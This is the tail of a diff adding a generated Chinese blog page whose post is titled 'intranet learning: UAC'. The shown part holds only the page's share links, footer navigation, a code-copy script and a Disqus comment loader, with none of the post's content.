+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/&name=内网学习--UAC&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/&t=内网学习--UAC"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018.12.8-2020
+    steady
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
